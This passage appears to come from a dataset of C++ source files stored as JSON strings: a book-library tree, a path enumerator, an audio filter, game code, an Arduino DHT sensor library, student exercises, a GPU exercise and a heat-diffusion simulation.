\"Enter ISBN to delete: \";\r\n                cin >> isbn;\r\n                if (search(root, isbn) != NULL) {\r\n                    root = deleteNode(root, isbn);\r\n                    cout << \"Book deleted successfully.\\n\";\r\n                } else {\r\n                    cout << \"Book not found.\\n\";\r\n                }\r\n                break;\r\n            case 4:\r\n                cout << \"Library books in order:\\n\";\r\n                inorder(root);\r\n                break;\r\n            case 5:\r\n                cout << \"Exiting the system. Goodbye!\\n\";\r\n                deleteTree(root);\r\n                return 0;\r\n            default:\r\n                cout << \"Invalid choice. Please try again.\\n\";\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "#include <iostream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\nclass Position {\npublic:\n    int x, y;\n\n    Position(int x, int y) : x(x), y(y) {}\n\n    bool operator==(const Position& other) const {\n        return x == other.x && y == other.y;\n    }\n\n    bool operator!=(const Position& other) const {\n        return !(*this == other);\n    }\n\n    friend ostream& operator<<(ostream& os, const Position& pos) {\n        os << \"(\" << pos.x << \",\" << pos.y << \")\";\n        return os;\n    }\n};\n\nvoid calculatePathsHelper(Position castle, vector<Position> soldiers, vector<Position> currentPath, vector<vector<Position>>& uniquePaths) {\n    if (soldiers.empty()) {\n        if (castle == currentPath.front()) {\n            uniquePaths.push_back(currentPath);\n        }\n        return;\n    }\n\n    for (auto it = soldiers.begin(); it != soldiers.end(); ++it) {\n        Position soldier = *it;\n        vector<Position> remainingSoldiers = soldiers;\n        remainingSoldiers.erase(it);\n        currentPath.push_back(soldier);\n        Position newCastle = soldier;\n        calculatePathsHelper(newCastle, remainingSoldiers, currentPath, uniquePaths);\n        currentPath.pop_back();\n    }\n}\n\nvector<vector<Position>> calculatePaths(Position castle, vector<Position> soldiers) {\n    vector<vector<Position>> uniquePaths;\n    vector<Position> currentPath;\n    currentPath.push_back(castle); // Start from the castle position\n    calculatePathsHelper(castle, soldiers, currentPath, uniquePaths);\n    return uniquePaths;\n}\n\nint main() {\n    int numSoldiers;\n    cout << \"Enter number of soldiers: \";\n    cin >> numSoldiers;\n\n    vector<Position> soldiers;\n\n    for (int i = 0; i < numSoldiers; ++i) {\n        int x, y;\n        cout << \"Enter coordinates for soldier \" << (i + 1) << \": \";\n        cin >> x >> y;\n        soldiers.emplace_back(x, y);\n    }\n\n    int startX, startY;\n    cout << \"Enter the coordinates for your \u201cspecial\u201d castle: \";\n    cin >> startX >> startY;\n    Position castle(startX, startY);\n\n    vector<vector<Position>> uniquePaths = calculatePaths(castle, soldiers);\n\n    cout << \"Thanks. There are \" << uniquePaths.size() << \" unique paths for your \u2018special_castle\u2019\" << endl;\n\n    for (size_t i = 0; i < uniquePaths.size(); ++i) {\n        cout << \"Path \" << (i + 1) << \":\" << endl;\n        for (const Position& pos : uniquePaths[i]) {\n            cout << pos << \" \";\n        }\n        cout << endl;\n    }\n\n    return 0;\n}\n",
    "#include <math.h>\n#include \"svf.h\"\n\n#define MIN(x, y) (((x) < (y)) ? (x) : (y))\n\nusing namespace daisysp;\n\nvoid Svf::Init(float sample_rate)\n{\n    sr_        = sample_rate;\n    fc_        = 200.0f;\n    res_       = 0.5f;\n    drive_     = 0.5f;\n    freq_      = 0.25f;\n    damp_      = 0.0f;\n    notch_     = 0.0f;\n    low_       = 0.0f;\n    high_      = 0.0f;\n    band_      = 0.0f;\n    peak_      = 0.0f;\n    input_     = 0.0f;\n    out_notch_ = 0.0f;\n    out_low_   = 0.0f;\n    out_high_  = 0.0f;\n    out_peak_  = 0.0f;\n    out_band_  = 0.0f;\n}\n\nvoid Svf::Process(float in)\n{\n    input_ = in;\n    // first pass\n    notch_     = input_ - damp_ * band_;\n    low_       = low_ + freq_ * band_;\n    high_      = notch_ - low_;\n    band_      = freq_ * high_ + band_ - drive_ * band_ * band_ * band_;\n    out_low_   = 0.5f * low_;\n    out_high_  = 0.5f * high_;\n    out_band_  = 0.5f * band_;\n    out_peak_  = 0.5f * (low_ - high_);\n    out_notch_ = 0.5f * notch_;\n    // second pass\n    notch_ = input_ - damp_ * band_;\n    low_   = low_ + freq_ * band_;\n    high_  = notch_ - low_;\n    band_  = freq_ * high_ + band_ - drive_ * band_ * band_ * band_;\n    out_low_ += 0.5f * low_;\n    out_high_ += 0.5f * high_;\n    out_band_ += 0.5f * band_;\n    out_peak_ += 0.5f * (low_ - high_);\n    out_notch_ += 0.5f * notch_;\n}\n\nvoid Svf::SetFreq(float f)\n{\n    if(f < 0.000001f)\n    {\n        fc_ = 0.000001f;\n    }\n    else if(f > sr_ / 2.0f)\n    {\n        fc_ = (sr_ / 2.0f) - 1.0f;\n    }\n    else\n    {\n        fc_ = f;\n    }\n    // Set Internal Frequency for fc_\n    freq_ = 2.0f\n            * sinf((float)M_PI\n                   * MIN(0.25f,\n                         fc_ / (sr_ * 2.0f))); // fs*2 because double sampled\n    // recalculate damp\n    //damp = (MIN(2.0f * powf(res_, 0.25f), MIN(2.0f, 2.0f / freq - freq * 0.5f)));\n    damp_ = MIN(2.0f * (1.0f - powf(res_, 0.25f)),\n                MIN(2.0f, 2.0f / freq_ - freq_ * 0.5f));\n}\n\nvoid Svf::SetRes(float r)\n{\n    if(r < 0.0f)\n    {\n        r = 0.0f;\n    }\n    else if(r > 1.0f)\n    {\n        r = 1.0f;\n    }\n    res_ = r;\n    // recalculate damp\n    //damp = (MIN(2.0f * powf(res_, 0.25f), MIN(2.0f, 2.0f / freq - freq * 0.5f)));\n    damp_ = MIN(2.0f * (1.0f - powf(res_, 0.25f)),\n                MIN(2.0f, 2.0f / freq_ - freq_ * 0.5f));\n}\n",
    "#include \"BackGround.h\"\n\nBackGround::BackGround() : g_nX(0.0f), goalX(0.0f)\n{\n\tm_speed = NORMAL;\n\tisScrollStopped = false;\n}\n\nvoid BackGround::Init(HDC hdc)\n{\n\tdc = hdc;\n\tgoalstr = L\"Goal!\";\n\taudience = BitMapManager::GetInstance()->GetImage(BACK_AUDIENCE0);\n\telephant = BitMapManager::GetInstance()->GetImage(BACK_ELEPHANT);\n\tgrass = BitMapManager::GetInstance()->GetImage(BACK_GRASS);\n\tm_line = RUNLINE;\n\t//goal = BitMapManager::GetInstance()->GetImage(IMAGE_GRASS);\n}\n\nvoid BackGround::Draw(HDC hdc)\n{\n\t//true\uc77c\uc2dc \uc2a4\ud06c\ub864 \uba48\ucda4\n\t//if (isScrollStopped) g_nX = 0;\n\n\tHDC memDC = CreateCompatibleDC(hdc);\n\tHBITMAP oldBitmap = (HBITMAP)SelectObject(memDC, audience);\n\n\twstring positionText = L\"Back_X: \" + to_wstring(g_nX);\n\tTextOut(hdc, 0, 40, positionText.c_str(), positionText.length());\n\t//m_background.Draw(backDC);\n\t\n\t//\uad00\uac1d\ubd80\ud130\n\tfor (int i = 0; i < 7; i++)\n\t{\n\t\taudience->Draw(hdc, g_nX + i * 100, 100, 230, 300);\n\t}\n\tSelectObject(memDC, elephant);\n\t//\ucf54\ub07c\ub9ac\ub85c \ubcc0\uacbd\n\telephant->Draw(hdc, g_nX + 7 * 100, 100, 230, 300);\n\tSelectObject(memDC, audience);\n\n\tfor (int i = 0; i < 7; i++)\n\t{\n\t\taudience->Draw(hdc, g_nX + (i + 8) * 100, 100, 230, 300);\n\t}\n\tSelectObject(memDC, elephant);\n\telephant->Draw(hdc, g_nX + (7 + 8) * 100, 100, 230, 300);\n\n\tSelectObject(memDC, grass);\n\n\tgrass->Draw(hdc, 0, 180, 1700, 510);\n\t//\uc2e4\ud5d8\uc6a9 \uace8\uc778\uc9c0\uc810 \ud14d\uc2a4\ud2b8\n\tTextOut(hdc, g_nX + 1350.0f, 500, goalstr.c_str(), goalstr.length());\n\n\tSelectObject(memDC, oldBitmap);\n\tDeleteDC(memDC);\n}\n\nvoid BackGround::Update(float deltaTime)\n{\n\t//\ub7f0\ub77c\uc778 \uc77c\ub54c \uc2a4\ud06c\ub864\n\tif (m_line == RUNLINE)\n\t{\n\t\tif (GetAsyncKeyState(VK_LEFT))\n\t\t{\n\t\t\tg_nX += m_speed * deltaTime;\n\t\t\ttotalDistance -= m_speed * deltaTime;\n\t\t}\n\t\tif (GetAsyncKeyState(VK_RIGHT))\n\t\t{\n\t\t\tg_nX -= m_speed * deltaTime;\n\t\t\ttotalDistance += m_speed * deltaTime;\n\t\t}\n\n\t\t//\ud3ec\uc9c0\uc158\uc774 -800 \uc774\ud558\ub85c \ub3c4\ub2ec\ud558\uba74 800\uc744 \ub354\ud574 \uc2a4\ud06c\ub864 \ubc18\ubcf5\n\t\tif (g_nX <= -800.0f) g_nX += 800.0f;\n\n\t\t//\uace8\ub300 \ud3ec\uc9c0\uc158 \uc5c5\ub370\uc774\ud2b8\n\t\tgoalX = g_nX + 1350.0f;\n\n\t\tif (IsGoal()) g_nX = -750.0f;  // \ud2b9\uc815 \uc704\uce58\ub85c \ucd08\uae30\ud654\n\t\telse if (IsStartLine()) g_nX = 0.0f;\n\t}\n\n\t\n}\n\n\nvoid BackGround::Render(HDC hdc)\n{\n}\n\nbool BackGround::IsGoal()\n{\n\t//g_nX = -750.0f;\n\treturn (goalX <= 600.0f);\n}\n\nbool BackGround::IsStartLine()\n{\n\treturn (totalDistance <= 50.0f);\n}\n\n\n\nBackGround::~BackGround()\n{\n}\n",
    "//\n//    FILE: dht.cpp\n//  AUTHOR: Rob Tillaart\n// VERSION: 0.1.29\n// PURPOSE: DHT Temperature & Humidity Sensor library for Arduino\n//     URL: http://arduino.cc/playground/Main/DHTLib\n//\n// HISTORY:\n// 0.1.29 2018-09-02 fix negative temperature DHT12 - issue #111\n// 0.1.28 2018-04-03 refactor\n// 0.1.27 2018-03-26 added _disableIRQ flag\n// 0.1.26 2017-12-12 explicit support for AM23XX series and DHT12\n// 0.1.25 2017-09-20 FIX https://github.com/RobTillaart/Arduino/issues/80\n// 0.1.24 2017-07-27 FIX https://github.com/RobTillaart/Arduino/issues/33  double -> float\n// 0.1.23 2017-07-24 FIX https://github.com/RobTillaart/Arduino/issues/31\n// 0.1.22 undo delayMicroseconds() for wakeups larger than 8\n// 0.1.21 replace delay with delayMicroseconds() + small fix\n// 0.1.20 Reduce footprint by using uint8_t as error codes. (thanks to chaveiro)\n// 0.1.19 masking error for DHT11 - FIXED (thanks Richard for noticing)\n// 0.1.18 version 1.16/17 broke the DHT11 - FIXED\n// 0.1.17 replaced micros() with adaptive loopcount\n//        removed DHTLIB_INVALID_VALUE\n//        added  DHTLIB_ERROR_CONNECT\n//        added  DHTLIB_ERROR_ACK_L  DHTLIB_ERROR_ACK_H\n// 0.1.16 masking unused bits (less errors); refactored bits[]\n// 0.1.15 reduced # micros calls 2->1 in inner loop.\n// 0.1.14 replace digital read with faster (~3x) code => more robust low MHz machines.\n//\n// 0.1.13 fix negative temperature\n// 0.1.12 support DHT33 and DHT44 initial version\n// 0.1.11 renamed DHTLIB_TIMEOUT\n// 0.1.10 optimized faster WAKEUP + TIMEOUT\n// 0.1.09 optimize size: timeout check + use of mask\n// 0.1.08 added formula for timeout based upon clockspeed\n// 0.1.07 added support for DHT21\n// 0.1.06 minimize footprint (2012-12-27)\n// 0.1.05 fixed negative temperature bug (thanks to Roseman)\n// 0.1.04 improved readability of code using DHTLIB_OK in code\n// 0.1.03 added error values for temp and humidity when read failed\n// 0.1.02 added error codes\n// 0.1.01 added support for Arduino 1.0, fixed typos (31/12/2011)\n// 0.1.00 by Rob Tillaart (01/04/2011)\n//\n// inspired by DHT11 library\n//\n// Released to the public domain\n//\n\n#include \"dht.h\"\n\n/////////////////////////////////////////////////////\n//\n// PUBLIC\n//\n\nint8_t dht::read11(uint8_t pin)\n{\n    // READ VALUES\n    if (_disableIRQ) noInterrupts();\n    int8_t result = _readSensor(pin, DHTLIB_DHT11_WAKEUP, DHTLIB_DHT11_LEADING_ZEROS);\n    if (_disableIRQ) interrupts();\n\n    // these bits are always zero, masking them reduces errors.\n    bits[0] &= 0x7F;\n    bits[2] &= 0x7F;\n\n    // CONVERT AND STORE\n    humidity    = bits[0];  // bits[1] == 0;\n    temperature = bits[2];  // bits[3] == 0;\n\n    // TEST CHECKSUM\n    uint8_t sum = bits[0] + bits[1] + bits[2] + bits[3];\n    if (bits[4] != sum)\n    {\n        return DHTLIB_ERROR_CHECKSUM;\n    }\n    return result;\n}\n\nint8_t dht::read12(uint8_t pin)\n{\n    // READ VALUES\n    if (_disableIRQ) noInterrupts();\n    int8_t result = _readSensor(pin, DHTLIB_DHT11_WAKEUP, DHTLIB_DHT11_LEADING_ZEROS);\n    if (_disableIRQ) interrupts();\n\n    // CONVERT AND STORE\n    humidity = bits[0] + bits[1] * 0.1;\n    temperature = bits[2] + (bits[3] & 0x7F) * 0.1;\n    if (bits[3] & 0x80)  // negative temperature\n    {\n        temperature = -temperature;\n    }\n\n    // TEST CHECKSUM\n    uint8_t sum = bits[0] + bits[1] + bits[2] + bits[3];\n    if (bits[4] != sum)\n    {\n        return DHTLIB_ERROR_CHECKSUM;\n    }\n    return result;\n}\n\nint8_t dht::read(uint8_t pin)\n{\n    // READ VALUES\n    if (_disableIRQ) noInterrupts();\n    int8_t result = _readSensor(pin, DHTLIB_DHT_WAKEUP, DHTLIB_DHT_LEADING_ZEROS);\n    if (_disableIRQ) interrupts();\n\n    // these bits are always zero, masking them reduces errors.\n    bits[0] &= 0x03;\n    bits[2] &= 0x83;\n\n    // CONVERT AND STORE\n    humidity = (bits[0]*256 + bits[1]) * 0.1;\n    temperature = ((bits[2] & 0x7F)*256 + bits[3]) * 0.1;\n    if (bits[2] & 0x80)  // negative temperature\n    {\n        temperature = -temperature;\n    }\n\n    // TEST CHECKSUM\n    uint8_t sum = bits[0] + bits[1] + bits[2] + bits[3];\n    if (bits[4] != sum)\n    {\n        return DHTLIB_ERROR_CHECKSUM;\n    }\n    return result;\n}\n\n/////////////////////////////////////////////////////\n//\n// PRIVATE\n//\n\nint8_t dht::_readSensor(uint8_t pin, uint8_t wakeupDelay, uint8_t leadingZeroBits)\n{\n    // INIT BUFFERVAR TO RECEIVE DATA\n    uint8_t mask = 128;\n    uint8_t idx = 0;\n\n    uint8_t data = 0;\n    uint8_t state = LOW;\n    uint8_t pstate = LOW;\n    uint16_t zeroLoop = DHTLIB_TIMEOUT;\n    uint16_t delta = 0;\n\n    leadingZeroBits = 40 - leadingZeroBits; // reverse counting...\n\n    // replace digitalRead() with Direct Port Reads.\n    // reduces footprint ~100 bytes => portability issue?\n    // direct port read is about 3x faster\n    uint8_t bit = digitalPinToBitMask(pin);\n    uint8_t port = digitalPinToPort(pin);\n    volatile uint32_t *PIR = portInputRegister(port);\n\n    // REQUEST SAMPLE\n    pinMode(pin, OUTPUT);\n    digitalWrite(pin, LOW); // T-be\n    if (wakeupDelay > 8) delay(wakeupDelay);\n    el",
    "/*Name:Arti auti ,DSPL Assigment no.1,date:01-Aug-2024*/\r\n#include <iostream>\r\nusing namespace std;\r\n\r\nclass LinearSearch\r\n{\r\n    int a[10], n, i, target;\r\npublic:\r\n    void accept();\r\n    int search();\r\n    int count();\r\n    void firstAndLastOccurrence();\r\n};\r\n\r\nvoid LinearSearch::accept()\r\n{\r\n    cout << \"Enter the size of the array: \";\r\n    cin >> n;\r\n    cout << \"Enter the elements in the array: \";\r\n    for (i = 0; i < n; i++) {\r\n        cin >> a[i];\r\n    }\r\n}\r\n\r\nint LinearSearch::search()\r\n{\r\n    cout << \"Enter the target: \";\r\n    cin >> target;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == target)\r\n        {\r\n            cout << \"Element \" << target << \" found at index \" << i << endl;\r\n            return i; // Return the index of the found element\r\n        }\r\n    }\r\n    cout << \"Element \" << target << \" not found\" << endl;\r\n    return -1; // Return -1 if the element is not found\r\n}\r\n\r\nint LinearSearch::count()\r\n{\r\n    cout << \"Enter the target to count: \";\r\n    cin >> target;\r\n    int count = 0;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == target)\r\n        {\r\n            count++;\r\n        }\r\n    }\r\n    cout << \"Element \" << target << \" occurred \" << count << \" times\" << endl;\r\n    return count;\r\n}\r\n\r\nvoid LinearSearch::firstAndLastOccurrence()\r\n{\r\n    cout << \"Enter the target to find occurrences: \";\r\n    cin >> target;\r\n  int first = -1;\r\n  int last = -1;\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        if (a[i] == target)\r\n        {\r\n            if (first == -1) {\r\n                first = i;\r\n            }\r\n            last = i;\r\n        }\r\n    }\r\n    if (first != -1) {\r\n        cout << \"First occurrence of \" << target << \" is at index \" << first << endl;\r\n        cout << \"Last occurrence of \" << target << \" is at index \" << last << endl;\r\n    }\r\n    else {\r\n        cout << \"Element \" << target << \" not found\" << endl;\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    LinearSearch l;\r\n    int choice, first, last;\r\n    do\r\n    {\r\n        cout << \"\\nMenu\\n\";\r\n        cout << \"1. Accept\\n\";\r\n        cout << \"2. Search\\n\";\r\n        cout << \"3. Count\\n\";\r\n        cout << \"4. First and Last Occurrences\\n\";\r\n        cout << \"5. Exit\\n\";\r\n        cout << \"Enter your choice: \";\r\n        cin >> choice;\r\n        switch (choice)\r\n        {\r\n        case 1:\r\n            l.accept();\r\n            break;\r\n        case 2:\r\n            l.search();\r\n            break;\r\n        case 3:\r\n            l.count();\r\n            break;\r\n        case 4:\r\n            l.firstAndLastOccurrence();\r\n            break;\r\n        case 5:\r\n            cout << \"Exiting...\\n\";\r\n            break;\r\n        default:\r\n            cout << \"Invalid choice. Try again.\\n\";\r\n        }\r\n    } while (choice != 5);\r\n\r\n    return 0;\r\n}",
    "#include <stdio.h>\n#include <math.h>\n#include \"hip/hip_runtime.h\"\n\n/* Macro for checking GPU API return values */\n#define gpuCheck(call)                                                                          \\\ndo{                                                                                             \\\n    hipError_t gpuErr = call;                                                                   \\\n    if(hipSuccess != gpuErr){                                                                   \\\n        printf(\"GPU API Error - %s:%d: '%s'\\n\", __FILE__, __LINE__, hipGetErrorString(gpuErr)); \\\n        exit(1);                                                                                \\\n    }                                                                                           \\\n}while(0)\n\n/* --------------------------------------------------\nSquare elements kernel\n-------------------------------------------------- */\n__global__ void square_elements(int *A, int n)\n{\n    int id = blockDim.x * blockIdx.x + threadIdx.x;\n\n\n    // TODO: Complete the kernel by squaring\n    //       all elements of the array.\n\n}\n\n/* --------------------------------------------------\nMain program\n-------------------------------------------------- */\nint main(int argc, char *argv[]){\n\n    /* Size of array */\n    int N = 1024 * 1024;\n\n    /* Bytes in N ints */\n    size_t bytes = N * sizeof(int);\n\n    /* Allocate memory for host array */\n    int *h_A = (int*)malloc(bytes);\n\n    /* Initialize host arrays */\n    for(int i=0; i<N; i++){\n        h_A[i] = i; \n    }    \n\n    /* Allocate memory for device array */\n    int *d_A;\n    gpuCheck( hipMalloc(&d_A, bytes) );\n\n    /* Copy data from host array to device array */\n    gpuCheck( hipMemcpy(d_A, h_A, bytes, hipMemcpyHostToDevice) );\n\n    /* Set kernel configuration parameters\n           thr_per_blk: number of threads per thread block\n           blk_in_grid: number of thread blocks in grid */\n    int thr_per_blk = 256;\n    int blk_in_grid = ceil( float(N) / thr_per_blk );\n\n    /* Launch kernel */\n    square_elements<<<blk_in_grid, thr_per_blk>>>(d_A, N);\n\n    /* Check for kernel launch errors */\n    gpuCheck( hipGetLastError() );\n\n    /* Check for kernel execution errors */\n    gpuCheck ( hipDeviceSynchronize() );\n\n    /* Copy data from device array to host array */\n    gpuCheck( hipMemcpy(h_A, d_A, bytes, hipMemcpyDeviceToHost) );\n\n    /* Check for correct results */\n    for (int i=0; i<N; i++){\n\n        if(h_A[i] != i * i){\n            printf(\"Error: h_A[%d] = %d instead of %d\\n\", i, h_A[i], i*i );\n            exit(1);\n        }\n    }\n\n    /* Free CPU memory */\n    free(h_A);\n\n    /* Free Device memory */\n    gpuCheck( hipFree(d_A) );\n\n    printf(\"\\n==============================\\n\");\n    printf(\"__SUCCESS__\\n\");\n    printf(\"------------------------------\\n\");\n    printf(\"N                : %d\\n\", N);\n    printf(\"Blocks in Grid   : %d\\n\",  blk_in_grid);\n    printf(\"Threads per Block: %d\\n\",  thr_per_blk);\n    printf(\"==============================\\n\\n\");\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <vector>\r\n#include <iomanip>\r\n#include <chrono>\r\n#include \"Field.h\"\r\nusing namespace std;\r\n\r\nconst int Nx = 101;//x\u65b9\u5411\u306e\u683c\u5b50\u6570\r\nconst int Ny = 101;//y\u65b9\u5411\u306e\u683c\u5b50\u6570\r\nconst double dt = 0.1;//\u6642\u9593\u30b9\u30c6\u30c3\u30d7\u5e45[s]\r\nconst double h = 0.003;//\u683c\u5b50\u5e45[m]\r\nconst double alpha_c = 2.27 * 1e-5;//\u7269\u4f53\u306e\u71b1\u62e1\u6563\u7387[m^2/s]\r\nconst double T_c = 273.0 + 15.0;//\u7269\u4f53\u306e\u6e29\u5ea6[K]\r\nconst double T_end = 273.0 + 50.0;// \u4e2d\u5fc3\u6e29\u5ea6\u306e\u76ee\u6a19\u6e29\u5ea6[K]\r\n\r\nint n_max = 10000;//\u6700\u5927\u6642\u9593\u30b9\u30c6\u30c3\u30d7\u6570\r\nconst bool output = true;//\u7d50\u679c\u3092\u30d5\u30a1\u30a4\u30eb\u306b\u51fa\u529b\u3059\u308b\u304b\u3069\u3046\u304b\r\n\r\nint main() {\r\n\r\n\t//\u8a08\u7b97\u6642\u9593\u6e2c\u5b9a\u958b\u59cb\r\n\tauto t0 = chrono::high_resolution_clock::now();\r\n\r\n\t//Field\u306e\u5ba3\u8a00\r\n\tField field;\r\n\t\r\n\t//Field\u306e\u521d\u671f\u5316\r\n\tfield.init(Nx, Ny, dt, h, alpha_c, T_c);\r\n\r\n\t//\u51fa\u529b\u3059\u308b\u5c0f\u6570\u70b9\u3092\u4e00\u6841\u306b\u56fa\u5b9a\r\n\tcout << fixed << setprecision(1);\r\n\t//0\u30b9\u30c6\u30c3\u30d7\u76ee(\u521d\u671f\u72b6\u614b)\u306e\u6e29\u5ea6\u5834\u3092\u30d5\u30a1\u30a4\u30eb\u306b\u51fa\u529b\u3059\u308b\r\n\tif (output)field.write_file(0);\r\n\r\n\t//\u305d\u308c\u305e\u308c\u306e\u6642\u9593\u30b9\u30c6\u30c3\u30d7\u3054\u3068\u306bGauss-Seidel\u6cd5\u3067\u6e29\u5ea6\u5834\u3092\u6c42\u3081\u308b\r\n\tfor (int n = 0; n < n_max; n++) {\r\n\t\t\r\n\t\t//n\u30b9\u30c6\u30c3\u30d7\u76ee\u306e\u6e29\u5ea6\u5834\u3092\u6c42\u3081\u308b\r\n\t\tfield.GaussSeidel(n);\r\n\r\n\t\t//n\u30b9\u30c6\u30c3\u30d7\u76ee\u306e\u6e29\u5ea6\u5834\u3092\u30d5\u30a1\u30a4\u30eb\u306b\u51fa\u529b\u3059\u308b\r\n\t\tif(output)field.write_file(n+1);\r\n\t\t\r\n\t\t//\u9818\u57df\u306e\u4e2d\u5fc3\u6e29\u5ea6\u304cT_end\u4ee5\u4e0a\u304b\u3069\u3046\u304b(T_end\u4ee5\u4e0a\u306a\u3089\u3070\u6642\u9593\u30b9\u30c6\u30c3\u30d7\u7d42\u4e86\u3001T_end\u672a\u6e80\u306a\u3089\u3070\u6642\u9593\u30b9\u30c6\u30c3\u30d7\u3092\u9032\u3081\u308b)\r\n\t\tif (field.get_T()[Nx / 2][Ny / 2] >= T_end) n_max = n + 1;\r\n\r\n\t\t//100\u6642\u9593\u30b9\u30c6\u30c3\u30d7\u3054\u3068\u306b\u4e2d\u5fc3\u6e29\u5ea6\u3092\u78ba\u8a8d\r\n\t\tif (n % 100 == 0) cout << \"t = \" << n*dt << \"s : \u4e2d\u5fc3\u6e29\u5ea6 = \" << field.get_T()[Nx / 2][Ny / 2] - 273.0 << \"\u2103\" << endl;\r\n\t}\r\n\tcout << endl;\r\n\tif (output)cout << \"output_0.txt\uff5eoutputfile_\" << n_max << \".txt were successfully saved.\" << endl;\r\n\r\n\t//\u4e2d\u5fc3\u6e29\u5ea6\u3068\u6642\u9593t\u306e\u78ba\u8a8d\r\n\tcout << \"\u4e2d\u5fc3\u6e29\u5ea6 = \" << field.get_T()[Nx / 2][Ny / 2] - 273.0 << \"\u2103 \u306f t = \" << n_max * dt << \"s \u3067\u9054\u6210\u3055\u308c\u307e\u3057\u305f\u3002\" << endl;\r\n\r\n\t//\u8a08\u7b97\u6642\u9593\u6e2c\u5b9a\u7d42\u4e86\r\n\tauto t1 = chrono::high_resolution_clock::now();\r\n\tcout << \"\u8a08\u7b97\u6642\u9593\u306f \" << double(chrono::duration_cast<chrono::milliseconds>(t1 - t0).count()) / 1000.0 << \" s\";\r\n\r\n\treturn 0;\r\n}",
    "\n//         Copyright Ciriaco Garcia de Celis 2016.\n// Distributed under the Boost Software License, Version 1.0.\n//    (See accompanying file LICENSE_1_0.txt or copy at\n//          http://www.boost.org/LICENSE_1_0.txt)\n\n#include \"MyLib.h\"\n#include <memory>\n\ntemplate <> void MyLib::onMessage(WantPrinter &) {\n  printer->send(LINE(\"<MyLib> sending printer to client\"));\n  publish(printer);\n\n  // some activity to spend ink\n  timerStart('A', std::chrono::nanoseconds(333333333), TimerCycle::Periodic);\n  timerStart(std::string(\"faster event\"), std::chrono::seconds(1),\n             TimerCycle::Periodic); // char const* const& is ugly\n  timerStart<std::string>(\"slower event\", std::chrono::seconds(2),\n                          TimerCycle::Periodic); // alternative syntax\n  timerStart(LibraryIsTired{}, std::chrono::seconds(8));\n\n  auto billingAddress =\n      callback<const std::shared_ptr<Billing>>(); // billingAddress(bill) is\n                                                  // equivalent to publish(bill)\n  timerStart(bills, std::chrono::seconds(1), billingAddress,\n             TimerCycle::Periodic); // periodic invocation\n}\n\ntemplate <> void MyLib::onMessage(std::shared_ptr<RequestA> &msg) {\n  printer->send(LINE(\"<MyLib> received \" << msg->data));\n  publish(std::make_shared<ReplyA>(\"reply to \" + msg->data));\n  bills->count++;\n}\n\ntemplate <> void MyLib::onMessage(std::shared_ptr<RequestB> &msg) {\n  printer->send(LINE(\"<MyLib> received \" << msg->data));\n  auto reply = std::make_shared<ReplyB>(\"reply to \" + msg->data);\n  publish(std::move(reply)); // example invalidating 'reply'\n  if (reply)\n    printer->send(LINE(\"<MyLib> no subscriber to replies for \" << msg->data));\n  bills->count++;\n}\n\ntemplate <> void MyLib::onTimer(const std::string &whatEvent) {\n  publish(std::unique_ptr<Info>(new Info{whatEvent}));\n}\n\ntemplate <> void MyLib::onTimer(const char &acter) {\n  printer->send(LINE(\"<MyLib> beat \" << acter));\n}\n\ntemplate <> void MyLib::onTimer(const LibraryIsTired &seriously) {\n  publish(seriously);\n}\n",
    "/***\n*\n*\tCopyright (c) 1996-2001, Valve LLC. All rights reserved.\n*\t\n*\tThis product contains software technology licensed from Id \n*\tSoftware, Inc. (\"Id Technology\").  Id Technology (c) 1996 Id Software, Inc. \n*\tAll Rights Reserved.\n*\n*   This source code contains proprietary and confidential information of\n*   Valve LLC and its suppliers.  Access to this code is restricted to\n*   persons who have executed a written SDK license with Valve.  Any access,\n*   use or distribution of this code by or to any unlicensed person is illegal.\n*\n****/\n//=========================================================\n// Zombie\n//=========================================================\n\n// UNDONE: Don't flinch every time you get hit\n\n#include\t\"extdll.h\"\n#include\t\"util.h\"\n#include\t\"cbase.h\"\n#include\t\"monsters.h\"\n#include\t\"schedule.h\"\n\n\n//=========================================================\n// Monster's Anim Events Go Here\n//=========================================================\n#define\tZOMBIE_AE_ATTACK_RIGHT\t\t0x01\n#define\tZOMBIE_AE_ATTACK_LEFT\t\t0x02\n#define\tZOMBIE_AE_ATTACK_BOTH\t\t0x03\n\n#define ZOMBIE_FLINCH_DELAY\t\t\t2\t\t// at most one flinch every n secs\n\nclass CZombie : public CBaseMonster\n{\npublic:\n\tvoid Spawn( void );\n\tvoid Precache( void );\n\tvoid SetYawSpeed( void );\n\tint  Classify ( void );\n\tvoid HandleAnimEvent( MonsterEvent_t *pEvent );\n\tint IgnoreConditions ( void );\n\n\tfloat m_flNextFlinch;\n\n\tvoid PainSound( void );\n\tvoid AlertSound( void );\n\tvoid IdleSound( void );\n\tvoid AttackSound( void );\n\n\tstatic const char *pAttackSounds[];\n\tstatic const char *pIdleSounds[];\n\tstatic const char *pAlertSounds[];\n\tstatic const char *pPainSounds[];\n\tstatic const char *pAttackHitSounds[];\n\tstatic const char *pAttackMissSounds[];\n\n\t// No range attacks\n\tBOOL CheckRangeAttack1 ( float flDot, float flDist ) { return FALSE; }\n\tBOOL CheckRangeAttack2 ( float flDot, float flDist ) { return FALSE; }\n\tint TakeDamage( entvars_t *pevInflictor, entvars_t *pevAttacker, float flDamage, int bitsDamageType );\n};\n\nLINK_ENTITY_TO_CLASS( monster_zombie, CZombie );\n\nconst char *CZombie::pAttackHitSounds[] = \n{\n\t\"zombie/claw_strike1.wav\",\n\t\"zombie/claw_strike2.wav\",\n\t\"zombie/claw_strike3.wav\",\n};\n\nconst char *CZombie::pAttackMissSounds[] = \n{\n\t\"zombie/claw_miss1.wav\",\n\t\"zombie/claw_miss2.wav\",\n};\n\nconst char *CZombie::pAttackSounds[] = \n{\n\t\"zombie/zo_attack1.wav\",\n\t\"zombie/zo_attack2.wav\",\n};\n\nconst char *CZombie::pIdleSounds[] = \n{\n\t\"zombie/zo_idle1.wav\",\n\t\"zombie/zo_idle2.wav\",\n\t\"zombie/zo_idle3.wav\",\n\t\"zombie/zo_idle4.wav\",\n};\n\nconst char *CZombie::pAlertSounds[] = \n{\n\t\"zombie/zo_alert10.wav\",\n\t\"zombie/zo_alert20.wav\",\n\t\"zombie/zo_alert30.wav\",\n};\n\nconst char *CZombie::pPainSounds[] = 